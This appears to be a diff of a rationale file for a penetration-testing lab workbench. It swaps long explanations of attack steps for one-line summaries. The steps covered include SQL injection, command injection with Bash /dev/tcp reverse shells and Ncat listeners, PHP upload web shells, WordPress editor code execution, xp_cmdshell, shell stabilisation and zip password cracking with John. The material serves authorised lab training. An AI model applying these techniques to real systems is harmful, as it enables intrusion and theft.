-A false result alone is not proof. True and restored ordinary controls must keep
-the expected record while only the false condition changes it. Query text can be
-reused in writes even by a seemingly harmless UI, so confirmed read-only context
-is a prerequisite, not inferred from HTTP GET.
-
-Source basis: [PortSwigger SQL injection](https://portswigger.net/web-security/sql-injection).
-Source and syntax review are not live SQL execution. WSQL-03/04 cover supported
-visible-result continuation and WSQL-06 covers a calibrated Boolean-only scalar.
-Neither implies database write, file/OS access or a verified shell. Generic
-EXP-01 does not complete an unsupported engine/context procedure.
-
-The original numeric condition remains the proof comparison. These new working
-handoffs replace the generic continuation advice only for their stated contexts.
-SQL interpretation, visible UNION output, engine identity, authorized row reads
-and OS execution remain distinct facts. Missing prerequisites remain unfinished
-work, not automatic promotion of the result.
-
-## WSTORE-01. Why require a retrieval and cleanup route?
-
-A successful create response does not prove persistence, display, cross-user
-visibility or execution. The paired retrieval confirms only that the inert marker
-is rendered in the observed view, while the explicit delete/reset request proves
-whether the test record can be removed. The branch stops on unknown cleanup and
-does not introduce markup or script payloads.
-
-## FTP-03. A successful upload is not execution
-
-The commands repeat the endpoint and filename deliberately. Each can be run
-without shell variables from an earlier step; the operator must keep the same
-observed context across them. Use a new ASCII filename to avoid overwriting an
-existing file or needing URL encoding. `--quote '+DELE ...'` runs against the
-same directory URL before the final directory listing. The `+` makes curl
-change to that directory before issuing `DELE`. A failed listing after `DELE`
-does not by itself establish that deletion failed; check the exact file again.
-
-FTP write permission is scoped to the identity and directory. A matching hash
-and confirmed removal establish one write/read/remove boundary. They do not
-show that another service consumes the file or that code executed. If the
-server, identity or directory changes, stop rather than deleting an unrelated
-path.
-
-## FTP-04. TLS transport and FTP authorization are separate facts
-
-Implicit FTPS and explicit FTP STARTTLS have different negotiation stages. A
-verified certificate establishes the endpoint's TLS identity, not a permitted
-FTP account or file access. Hostname verification and the assigned CA are
-therefore mandatory, while `-k`, guessed credentials and plaintext fallback are
-excluded. Each command stands alone; the FTP reply and TLS verification result
-are printed without a prior variable setup. A zero TLS verification result
-does not override a failed curl exit or an FTP denial. The next FTP decision
-must use the same verified host, port, mode and identity context. The listing
-requires a completed transfer exit, not just a login banner. See the
-[curl manual](https://curl.se/docs/manpage.html) for `--ssl-reqd`, `--resolve`
-and prompted `--user` behavior.
-
-## SMB-03. A writable share is not execution
-
-Each line at the `smb: \>` prompt is a complete client command. The current
-share and directory are visible in the client session, as they are in an
-ordinary terminal. Keeping one authenticated connection avoids repeated
-password prompts. If that connection closes before deletion, reopen only the
-same share and identity, return to the exact directory and remove the exact
-name. A failed `ls` or `get` can mean denial rather than absence, so record the
-response before interpreting cleanup.
-
-The inert marker and matching hash establish one file write/read boundary.
-Explicit deletion plus an exact missing-file response establish removal. None
-of these show that a service, task, logon action or application consumes the
-file. If deletion cannot be confirmed, preserve the path for recovery rather
-than creating another file.
-
-## WEXEC-02. Quoting belongs to the server's parser
-
-The payload closes the observed literal, adds a command separator and comments
-out the known remainder of that POSIX command line. Single quotes block expansion
-inside the original literal; double quotes have different expansion rules. These
-examples assume the application does not escape the supplied quote and that the
-newline/parentheses/command context is already understood. `#` must begin a new
-shell word, which is why there is a space before it. A new line or an independently
-parsed trailing command is not automatically suppressed by this comment.
-
-Curl passes the payload as data, not Kali code. An application passing that text
-as an argv element does not invoke the inserted shell syntax. A matching quote
-example that works against a deliberately unsafe fixture does not establish that
-the real application uses a shell. Command substitution, quote encoding/bypasses,
-stored input, blind output and foothold delivery remain separate procedures.
-
-Source basis: [PortSwigger command injection](https://portswigger.net/web-security/os-command-injection),
-including its quote-closing and interpreter distinctions. Native read-only proof
-is stronger than reflection, but still needs exact request/output attribution.
-
-## WEXEC-03. cmd syntax is not PowerShell syntax
-
-`&` sequences commands in cmd; it does not have POSIX background-job semantics.
-`&&` would condition execution on the preceding command's success, so this proof
-does not use it. The arithmetic output is not a contiguous request substring.
-Neither arithmetic nor an error proves who executed it; the native result and
-restored ordinary control are separate checks. An application that computes
-expressions itself can still produce the same number without shell execution.
-
-`rem` handles only the assumed benign trailing text. Additional metacharacters,
-nested quoting, batch expansion, delayed expansion, `/s` or another shell layer
-need their own exact construction. Local Windows cmd fixture checks cannot prove
-the vulnerable application's OS/parser, actual `cmd /c` quote handling or remote
-output capture. SYSTEM-like text is not token verification or objective proof.
-
-Primary syntax sources: [cmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd),
-[set arithmetic](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1),
-[whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
-and [ver](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver).
-
-## WEXEC-04. A request, a connection and a shell are separate observations
-
-The payload enters the already verified unquoted command context and explicitly
-starts the observed Bash path. Bash interprets its network redirection and
-duplicates the connected socket for stdin/stdout/stderr. It is not a portable
-`/bin/sh` feature. See [Bash redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).
-
-Ncat's explicit listen address limits the bind to the named Kali interface. With
-no keep-open option, it accepts one connection and does not spawn a Kali command.
-This plaintext channel has no peer authentication; correlate connection and host
-observations, and do not use it to transfer protected credentials. See
-[Ncat basic usage](https://nmap.org/ncat/guide/ncat-usage.html).
-
-The payload is a single local curl argument; the target interprets it only in the
-previously verified command construction. `--data-urlencode` preserves HTTP field
-encoding, not server-side safety. The request uses no retry/redirect behavior.
-Curl's time limit describes its local transfer, not the remote process lifetime.
-See [curl options](https://curl.se/docs/manpage.html).
-
-This covers one Linux unquoted Bash GET/form path. WEXEC-05 covers only the
-matching, already verified quoted Bash context. Windows,
-output-blind/asynchronous carriers, unavailable network redirection and other
-runtime channels remain distinct procedures. Native listener, HTTP-worker and
-session cleanup behavior need live authorized trials; offline argv/syntax checks
-are not foothold proof.
-
-## WEXEC-05. Closing a known argument quote is not a generic payload
-
-The selected first quote closes only the observed server-side quoted argument.
-The inner double-quoted string is then passed to the separately observed Bash
-path for its network redirection. A different wrapping shell, nested command,
-unsafe original action or unknown tail invalidates this template. The matching
-WEXEC-02 proof is the entry gate, not proof that this later delivery worked.
-See the [Bash quoting manual](https://www.gnu.org/software/bash/manual/html_node/Quoting.html)
-and [redirection manual](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).
-
-The explicit Ncat address binds only the named Kali interface; the socket is
-plaintext and unauthenticated. Correlate the peer and independent host/identity
-results. Curl's time limit applies to the HTTP client, not the remote Bash
-process. See [Ncat usage](https://nmap.org/ncat/guide/ncat-usage.html) and the
-[curl manual](https://curl.se/docs/manpage.html). This step does not verify
-Windows cmd, PowerShell, direct argv or a second request carrier. Native target
-quoting, HTTP worker behavior, listener and cleanup need an authorized lab trial.
-
-## WSQL-02. Literal closing depends on the actual query
-
-The paired condition preserves the selected value and uses the application's
-final quote. Escaped literals, casts, parentheses, prepared statements and reuse
-inside writes can invalidate it. GET alone does not establish a read-only action.
-[PortSwigger SQL injection](https://portswigger.net/web-security/sql-injection)
-explains the distinction. Changed error text alone is not Boolean proof.
-
-## WSQL-03. Width, type and display are separate facts
-
-NULL reduces type assumptions but may not render. A displayed arithmetic value
-absent from request text reduces echo confusion. Text must still fit the selected
-column. [PortSwigger UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
-documents the count/type prerequisites. MySQL requires whitespace after `--`;
-Oracle's FROM requirement is a separate variant. A chosen budget bounds contact,
-not a claim to have tried every width. Match the actual layout in all later steps.
-
-## WSQL-04. Database reading is not operating-system privilege
-
-Version/database functions differ by engine. MySQL/MariaDB share syntax;
-interpret the actual version string. Catalog visibility depends on role/schema.
-NULL, multiple rows, conversion and truncation are different outcomes. SQLite
-can choose a first scalar row, so uniqueness must be established independently.
-Metadata and one row do not establish administrator rights, an OS shell or an
-objective. Primary references: [PostgreSQL information functions](https://www.postgresql.org/docs/current/functions-info.html),
-[MySQL information functions](https://dev.mysql.com/doc/refman/8.4/en/information-functions.html),
-[SQLite core functions](https://www.sqlite.org/lang_corefunc.html),
-[SQL Server version](https://learn.microsoft.com/en-us/sql/t-sql/functions/version-transact-sql-configuration-functions?view=sql-server-ver17),
-[PostgreSQL tables](https://www.postgresql.org/docs/current/infoschema-tables.html),
-[SQL Server tables](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-tables-transact-sql?view=sql-server-ver17)
-and [SQLite schema aliases](https://www.sqlite.org/schematab.html).
-
-## WSQL-05. A cursor is limited catalog coverage
-
-MIN plus a lexical cursor selects one next name in one namespace. Collation,
-case-equivalent names, concurrent changes and rights can skip or hide objects.
-Reset between table and column cursors. [SQLite table-valued PRAGMA](https://www.sqlite.org/pragma.html#pragma_table_info)
-requires 3.16+; ordinary table_info can omit hidden/generated columns. Namespace
-and object visibility differ across engines. No exhausted cursor proves that
-every schema/view/hidden object was inspected. Preserve the actual extent.
-
-## WSQL-06. Boolean recovery requires a stable discriminator
-
-Use the calibrated selected record, not size/status/error alone. NULL/no row is
-not empty text. Character length and code functions are engine/type-dependent;
-the SQL Server sentinel preserves trailing spaces under LEN. Printable ASCII
-avoids claiming equivalent byte/Unicode semantics. Numeric codes also avoid
-case-insensitive string equality. Changed data invalidates prior positions.
-Primary references: [PostgreSQL strings](https://www.postgresql.org/docs/current/functions-string.html),
-[MySQL strings](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html),
-[SQLite functions](https://www.sqlite.org/lang_corefunc.html),
-[SQL Server SUBSTRING](https://learn.microsoft.com/en-us/sql/t-sql/functions/substring-transact-sql?view=sql-server-ver17)
-and [SQL Server LEN](https://learn.microsoft.com/en-us/sql/t-sql/functions/len-transact-sql?view=sql-server-ver17).
-Offline syntax/SQLite fixtures do not validate other engines, HTTP behavior or
-fresh-box usability. Engine file/OS operations remain separate procedures.
-
-## WUPLOAD-01. Storage and delivery are separate facts
-
-An upload response can describe a queued conversion, renamed file, private blob
-or failed store. Comparing one unique inert marker ties the observed URL to this
-attempt without overwriting an existing object. Normal record deletion is a
-concrete manual action whose exact API depends on the application; this checklist
-does not invent a universal delete endpoint. If no deletion/recovery path exists,
-that prerequisite is unresolved before adding an executable file.
-
-The [curl manual](https://curl.se/docs/manpage.html) documents multipart `--form`
-and literal `--form-string`. A refreshed CSRF value and correct identity are part
-of the working request. Altering a filename does not prove extension validation
-can be bypassed, and a downloadable file does not prove a server interpreter.
-
-## WUPLOAD-02. Interpreter proof, shell access and cleanup are distinct
-
-The filename variant represents the source's multipart-name change without
-replacing an application file. Curl's `filename=` and `type=` set metadata of
-that part; they do not transform the bytes or select the server's interpreter.
-Both upload choices use the same generated proof, observed stored URL and
-token-bound proof/callback/removal steps. Only one choice is sent per attempt.
-The actual application response and PHP execution proof determine the next
-choice. A content-signature bypass or another handler still needs its own
-procedure. See [curl multipart form options](https://curl.se/docs/manpage.html#-F).
-
-The local Python helper contains the former inline generator, with the same
-fixed proof/callback/self-removal actions and private files. It refuses existing
-artifact names and a symlink output directory. It does not install dependencies,
-upload files, launch a listener or execute PHP. Keep the reviewed helper's hash
-with the artifact provenance, using `sha256sum '<local-path-to-make-lab-upload-proof.py>'`.
-Its action token remains protected data; do not paste the generated header or
-PHP source into shared logs. The CLI takes the output directory, owned IPv4 and
-unused unprivileged listener port, with no shell setup variables.
-
-The PHP template creates one unique, token-gated temporary executable artifact.
-The token is local secret material; retain it only in the private action-header
-file until cleanup, never in source control, audit prose or query parameters.
-Literal source disclosure exposes that token and ends this attempt. PHP 7.4+
-[proc_open](https://www.php.net/manual/en/function.proc-open.php) supports direct
-argument arrays and existing stream descriptors. The fixed proof runs `id`; the
-optional callback starts Bash without an HTTP-selected command string.
-
-The [socket connection timeout](https://www.php.net/manual/en/function.stream-socket-client.php)
-only bounds connection establishment. PHP/web-server worker limits, child-process
-lifetime and a curl client deadline are different controls. This procedure does
-not detach or install a persistent shell. The operator must close the foreground
-shell and verify cleanup, including a hung worker if relevant. Keep listener peer
-evidence and independent host/identity checks, since an unauthenticated TCP peer
-could connect first. [Ncat's reference](https://nmap.org/book/ncat-man.html)
-documents explicit-address listen mode and the distinct keep-open option.
-
-[unlink](https://www.php.net/manual/en/function.unlink.php) removes the executing
-file's pathname, not a duplicate/staged upload or application database record.
-An executing child can outlive file removal. CDN/cache behavior and virtual 404s
-also differ from backing storage. Verify each created resource, keep cleanup
-uncertainty visible, and recover the disposable lab instead of claiming absence
-from a status code. Other runtime, handler-bypass and shell-stabilization paths
-remain separate practical authoring work and prospective validation is pending.
-
-## WEDIT-01. Editor permission, persistence, execution and restoration differ
-
-WordPress validates theme/file, capability and nonce context. Current code can
-make loopback checks and revert an active PHP edit that introduces a fatal error.
-Installed versions differ. Keep the actual UI/request and re-read the selected
-source instead of assuming a generic POST or success banner persists. The source
-walkthrough shows a stylesheet edit and later 404-template success; it does not
-establish CSS execution, exact first trigger or restoration. Those remain separate
-observations here.
-
-The local copier decodes one HTML-escaped UTF-8 textarea inside the selected
-WordPress form, with matched theme/file. It preserves source-field entities and
-LF bytes and rejects CR-containing input; it does not authenticate the response, prove a
-server filesystem identity, create a filesystem backup or handle every editor.
-Source filters, mixed encodings, normalization and concurrent writes can break
-equivalence. LF-only known source, fresh attributed reads and tested recovery are
-required. A bad parse leaves the response for review rather than guessing content.
-
-`--existing-file` disables deletion in the generated PHP. Its marker names the
-proof run, not a newly uploaded target file. A proof exit reports native process
-identity; a callback needs separate host/session verification. Never use the
-upload-only default's unlink action on an original application file. Editor-level
-restoration leaves normal application history/cache/log effects; retain those
-limits instead of claiming the experiment left no trace.
-
-Primary references: [WordPress editor source](https://github.com/WordPress/WordPress/blob/master/wp-admin/theme-editor.php)
-and [theme/plugin edit validation and revert checks](https://developer.wordpress.org/reference/functions/wp_edit_theme_plugin_file/).
-They explain modern behavior, not the installed lab version. No app runtime lookup,
-credential attempt, file edit or callback is automated by Workbench.
-
-## EXP-01. Why source and context before running even help?
-
-Startup code can perform actions before parsing options. Match the exact exercised
-function, not just a version string or advisory title. Keep distribution fixes,
-architecture and authentication requirements visible. The code-review commands
-find candidate lines, not prove absence of harmful behavior or perform a complete
-audit. A later source change invalidates the previously reviewed hash.
-
-Copying preserves the original for comparison; it does not confer trust. Resolve
-symlink paths and keep each variant in protected adventure storage. The broad
-`EXP-001` observation in [checklist.md](checklist.md) supplies these prerequisites.
-No private lab solution or exploit payload is included here.
-
-The private Bash copy uses `set -C` only inside a subshell and a restrictive
-umask. [Bash's redirection rules](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
-describe noclobber behavior for existing regular files; the explicit private
-directory and pre-existing-link refusal are still important. An unsuccessful
-read can leave a partial new variant, which is not safe to edit or run.
-
-## EXP-02. Why an argv array and independent observation?
-
-Separate quoted arguments preserve boundaries without `eval` or rebuilding
-a shell command. The executable itself still needs review. Its documented flags
-cannot be guessed by a generic checklist. This decision gives an exact execution
-wrapper, not a recipe for every exploit. Candidate-specific payload construction,
-listener creation and restoration remain required reviewed procedures.
-
-GNU timeout statuses describe the local process. Signals may leave remote state
-or detached children alive; recovery is separate. See the
-[GNU timeout manual](https://man7.org/linux/man-pages/man1/timeout.1.html).
-The `EXP-002` source observation distinguishes delivery, callback, crash and shell.
-The callback command check applies only when the reviewed procedure promised a
-shell over that channel. A peer connection or echoed keystroke is not native
-host output. If the protocol or target OS is unknown, keep the connection as an
-observation and name the missing verification method instead of probing blindly.
-
-## EXP-03. Why not infer privilege or objective from the prompt?
-
-Additional context only when connection evidence and the initial host/account
-checks do not settle attribution. Do not require every inventory command before
-entering host work.
-
-In the target Linux shell:
-
-```bash
-date -u '+%Y-%m-%dT%H:%M:%SZ'
-ip -brief address
-```
-
-In target Windows cmd:
-
-```cmd
-whoami /all
-ipconfig
-```
-
-In target Windows PowerShell, including Windows PowerShell 5.1:
-
-```powershell
-[DateTime]::UtcNow.ToString('o')
-whoami /all
-Get-CimInstance Win32_OperatingSystem | Select-Object Caption, OSArchitecture
-Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress
-```
-
-Denied or unavailable inventory is a limitation, not a reason to run another
-exploit. Apply EXP-03's result table using the remaining connection evidence.
-
-Record the actual host and effective identity in the process that will perform
-work. Hostname alone is weak correlation, and an IP can be hidden by NAT or a proxy.
-Combine connection/session provenance and host observations. Linux `id` reports
-the current process's identities; Windows `whoami /all` exposes token context.
-Neither independently proves the lab objective. See
-[id](https://man7.org/linux/man-pages/man1/id.1.html) and the preserved
-[Windows/AD WIN-01](windows-ad-practical.json).
-Windows command behavior is documented in [whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
-and [ver](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver).
-
-These decisions need prospective candidate/error/session trials. They do not turn
-the application into an autonomous execution framework or mark tasks complete
-from terminal banners. No target was contacted while authoring them.
-
-PTY creation changes terminal usability. Transfer changes only the presence of
-one explicitly chosen file. Host/identity provenance, tool review, later use and
-cleanup remain distinct. Keep the original target context when visiting either
-support procedure, then return to the actual still-unanswered host question.
-
-## SHELL-01. A PTY and local terminal mode solve different problems
-
-[Python pty.spawn](https://docs.python.org/3/library/pty.html) connects a child
-process to a pseudo-terminal. The socket still carries bytes; local cooked mode
-can intercept control keys before they reach that PTY. Raw/no-echo mode changes
-the local Kali tty, not the target's identity. A shell prompt, `/dev/pts` and
-working arrows are usability evidence only.
-
-Saving the actual local mode before changing it allows exact recovery. Foreground
-job selection must name the suspended socket process. The appended restore
-command runs when it returns; it is not delivered as a target command. Host
-terminal shortcuts and Workbench input mode can intercept keys, so local job
-control must be verified rather than assumed. Python's PTY copy loop may outlive
-stdin EOF; close the child and original channel explicitly. GNU stty documents
-saved-mode recovery and `-F` in its
-[manual](https://manpages.debian.org/trixie/coreutils/stty.1.en.html).
-
-## SHELL-02. An editor child shell keeps the existing authority
-
-Vim's `:shell` starts the executable in its shell option. The child's PATH can
-be changed without altering the restricted parent's PATH. Vim's own restricted
-mode may prohibit shell commands; that is a separate failed prerequisite.
-No-file launch and `-u NONE`, `-n`, `-i NONE` avoid editor configuration, swap
-and persistent viminfo writes, not Bash startup/history effects. Source prose
-describes the editor inputs, while the screenshots show launch and later usable
-commands; neither alone proves every current target behaves identically.
-See [Vim startup options](https://vimhelp.org/starting.txt.html)
-and [Vim shell commands](https://vimhelp.org/usr_21.txt.html).
-
-## XFER-01. Byte integrity is not artifact trust or encrypted transport
-
-[Python's HTTP server](https://docs.python.org/3/library/http.server.html) offers
-explicit bind/directory options but basic security only and no authentication in
-this invocation. A fresh directory with one ordinary copy limits exposed content.
-Its handler can follow symlinks, which is why the staging inventory must not
-contain any. It is a temporary lab-transfer aid, not a production endpoint.
-
-The destination hash must come from independently recorded staged bytes, not a
-checksum fetched through the same unauthenticated request. Matching SHA256 and
-length establish this transfer's bytes, not safety, applicability, authorization
-to execute or provenance of the original file. Preserve that review at EXP-01.
-The [curl manual](https://curl.se/docs/manpage.html) describes `--fail`, transport
-restriction, time/size limits and output files. A new private receive directory
-avoids overwriting a target file; a failed curl can still leave partial bytes.
-Server termination, target artifact removal and Kali staging cleanup remain
-separate checks. Live PTY/transfer/recovery behavior is still pending validation.
-
-## XFER-02. Encrypted transport does not grant read or login authority
-
-OpenSSH 9.0+ scp uses SFTP by default. The SSH account must independently have
-SFTP read permission for the selected path. A callback with higher privilege
-does not grant those rights to an unrelated SSH account. Forced companion
-commands do not provide SFTP access. Do not remove their restrictions to make
-this transfer work. A recovered key is the artifact, not the identity used to
-copy it. Its later authentication still requires a separately permitted check.
-
-The fresh private directory prevents accidental overwrite of a retained local
-copy under the stated trusted-parent/quiet-client prerequisite. Scp is not a
-bounded or transactional receiver. The reviewed small source and absent local
-destination are prerequisites; interruption can leave partial bytes. Comparing
-against a separately recorded target size/hash detects mismatch, not every
-concurrent change or malicious server. No-clobber is a precondition, not a claim
-that scp itself supplies an atomic exclusive-create option. In a competing-writer
-directory or with an untrusted server that may send unlimited data, stop for a
-different receiver rather than assuming these commands impose a transfer cap.
-
-Primary reference: [OpenSSH scp manual](https://man.openbsd.org/scp). No runtime
-lookup is added. The working commands require the installed version and existing
-host-trust context, not the latest manual alone.
-
-## ART-01. Why a plausible archive or key is not access
-
-The Photographer source's downloaded ZIP lacks the expected live config,
-whereas SoSimple has a key-shaped false lead and a separate working key. These
-are reasons to inspect the exact local artifact and verify subsequent access,
-not to keep trying every artifact. `zipinfo -l` reports archive metadata without
-extracting members; names can contain untrusted control characters, so the
-working display is bounded and passed through `cat -v`. Its first 80 lines are
-not a complete listing for a larger archive. Claimed sizes are not a safe
-decompression budget. See the [Debian zipinfo manual](https://manpages.debian.org/testing/unzip/zipinfo.1.en.html).
-
-`ssh-keygen -lf` reports a key fingerprint without proving that an SSH server
-accepts it for a particular user. SSH-01 still verifies server identity and
-SSH-02 verifies a usable channel and target identity. An encrypted/unsupported
-key, a copied public key or a pattern that merely resembles key material needs
-its own exact explanation; no automated password recovery is implied. See the
-[OpenSSH ssh-keygen manual](https://manpages.debian.org/trixie/openssh-client/ssh-keygen.1.en.html).
-
-## ART-02. Why select one member instead of extracting the archive
-
-The helper uses exact `ZipInfo` matching, rejects duplicates and non-regular
-members, reads within a fixed budget, and completes the CRC-checked read before
-creating an output. It does not call `extract` or `extractall`. Thus a member's
-name, Unix permissions and directory layout never choose the local destination.
-The output uses exclusive creation so a pre-existing file is not overwritten.
-An I/O failure after creation can leave a partial file; the exit result and
-recorded hash must distinguish it from a completed copy.
-
-The existing protected parent directory remains the operator's responsibility.
-The helper refuses symlink parents, but is not a filesystem lock against another
-process changing that directory concurrently. Use a private directory not
-writable by unrelated users. Windows permissions differ from Kali's 0600 mode;
-the working procedure is for Kali, not a Windows custody guarantee.
-
-Traditional encrypted ZIPs accept one prompted password through `zipfile`.
-No password candidate list, AES support or archive password recovery is included.
-Keep secrets in the local adventure environment. See [Python ZIP member reads
-and encryption support](https://docs.python.org/3/library/zipfile.html).
-
-## ART-03. Why recovery and access are separate decisions
-
-FunboxRookie's downloaded archive recovery precedes a private-key read and a
-separate SSH session. Another key's failed channel is not proof that the ZIP
-password or key was wrong. ART-03 supplies the missing offline transition;
-ART-02 still verifies the exact decrypted member, and SSH-01/02 still establish
-host trust, permitted authentication and usable native identity.
-
-Kali documents `zip2john -o` for selecting one traditional encrypted member;
-otherwise its conversion assumes a common password across members. This is
-why the procedure does not submit every archive or force a format that has not
-matched. See [Kali's zip2john usage](https://www.kali.org/tools/john/#zip2john).
-
-John's wordlist mode, disabled rules, separate pot/session files and positive
-time budget keep this attempt explicit. A time limit is cooperative, not an OS
-process sandbox; wait for actual exit. Session names also choose log/recovery
-paths. Verbosity 1 avoids printing recovered candidates during the attempt;
-`--show` deliberately writes them into the private result file. Existing pot
-files can suppress prior successes, so use the fresh directory, not a global
-pot. See [John Jumbo options](https://github.com/openwall/john/blob/bleeding-jumbo/doc/OPTIONS).
+## DB-01. What decides this step?
+
+The engine is confirmed before a client and one identity are used.
+
+## DB-02. What decides this step?
+
+Role and metadata are read before any data or right is assumed.
+
+## DB-06. What decides this step?
+
+Oracle returns identity and owned objects only, no OS command.
+
+## DB-07. What decides this step?
+
+`COPY FROM PROGRAM` is an execution proof, not a shell.
+
+## DB-08. What decides this step?
+
+`pg_read_binary_file` reads one bounded server-side file.
+
+## DB-03. What decides this step?
+
+sqlcmd proves the SQL login; TLS failure is not a credential verdict.
+
+## DB-04. What decides this step?
+
+Login, role and configuration are separate facts.
+
+## DB-05. What decides this step?
+
+`xp_cmdshell` proves the service account, then the settings are restored.
+
+## MAIL-01. What decides this step?
+
+TLS mode is confirmed before any protocol command.
+
+## MAIL-02. What decides this step?
+
+IMAP `BODY.PEEK` reads without changing flags.
+
+## MAIL-03. What decides this step?
+
+POP3 `TOP` reads without `DELE`.
+
+## RDP-01. What decides this step?
+
+Certificate verification stays on unless a fingerprint is supplied.
+
+## RDP-02. What decides this step?
+
+Host and account must match before the token is examined.
+
+## WREAD-01. What decides this step?
+
+A traversal probe is compared with the ordinary file and a missing-file control.
+
+## WEXEC-01. What decides this step?
+
+An assembled marker proves shell interpretation; `id` proves identity.
+
+## WSQL-01. What decides this step?
+
+True and false pairs prove Boolean logic in a numeric lookup.
+
+## WSTORE-01. What decides this step?
+
+The marker must appear after create and disappear after the observed delete.
+
+## FTP-03. What decides this step?
+
+The inert probe proves write and delete without changing content.
+
+## FTP-04. What decides this step?
+
+Verified TLS must hold before plaintext is abandoned.
+
+## SMB-03. What decides this step?
+
+Write and delete prove the path is usable; they do not prove execution.
+
+## WEXEC-02. What decides this step?
+
+The closing quote plus `#` proves the known quoted context.
+
+## WEXEC-03. What decides this step?
+
+`set /a` returns a value the request does not contain.
+
+## WEXEC-04. What decides this step?
+
+`/dev/tcp` from an unquoted argument yields a socket shell.
+
+## WEXEC-05. What decides this step?
+
+The same payload works through a known quoted argument.
+
+## WSQL-02. What decides this step?
+
+Paired `'1'='1'` and `'1'='2'` confirms a single-quoted context.
+
+## WSQL-03. What decides this step?
+
+One `NULL` per column finds the UNION width.
+
+## WSQL-04. What decides this step?
+
+The engine expression picks version and database.
+
+## WSQL-05. What decides this step?
+
+One name per request with a `MIN(...)` cursor.
+
+## WSQL-06. What decides this step?
+
+Length and character equality read one scalar without visible output.
+
+## WUPLOAD-01. What decides this step?
+
+The marker must match byte for byte at the returned URL.
+
+## WUPLOAD-02. What decides this step?
+
+The proof file returns identity and can open one callback.
+
+## WEDIT-01. What decides this step?
+
+The template is captured, replaced, proven and restored.
+
+## EXP-01. What decides this step?
+
+Candidate review compares every prerequisite, not a title.
+
+## EXP-02. What decides this step?
+
+Raw output and a real host/identity are the only success evidence.
+
+## EXP-03. What decides this step?
+
+Host and identity attribution precedes any host work.
+
+## SHELL-01. What decides this step?
+
+A PTY needs local job control and target Python.
+
+## SHELL-02. What decides this step?
+
+Vim shell recovery is a same-user shell, not privilege.
+
+## XFER-01. What decides this step?
+
+Hash the file on both sides; transfer does not execute it.
+
+## XFER-02. What decides this step?
+
+Only an authenticated encrypted copy protects sensitive files.
+
+## ART-01. What decides this step?
+
+Type, hash and strings decide the next local branch.
+
+## ART-02. What decides this step?
+
+One ZIP member is extracted and previewed bounded.
+
+## ART-03. What decides this step?
+
+One wordlist and one time budget; a candidate is confirmed in ART-02.
 
 ## LNX-01. Keep the first identity check small
 
